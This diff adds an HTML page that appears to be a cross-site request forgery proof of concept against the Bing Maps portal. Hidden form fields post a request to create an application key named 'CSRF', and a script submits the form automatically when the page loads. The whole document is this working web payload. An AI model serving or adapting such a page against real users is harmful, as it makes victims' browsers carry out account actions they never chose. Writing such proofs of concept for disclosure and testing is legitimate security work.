@@ -1,0 +1,20 @@
+<html>
+<head>  
+
+</head>
+  <body>
+    <form  id = "f" action="https://www.bingmapsportal.com/api/application" method="POST" enctype="application/json">
+      <input type="hidden" name="keyTypeId"  value="2" />
+      <input type="hidden" name="keyTypeText"  value="Basic" />
+	  <input type="hidden" name="keySubtypeId"  value="35" />
+	  <input type="hidden" name="keySubtypeText"  value="Dev/Test" />
+	  <input type="hidden" name="applicationName"  value="CSRF" />
+      <input type="submit" value="Submit request" />
+    </form>
+	<script>
+document.getElementById("f").submit();
+</script>
+  </body>
+</html>
+
+
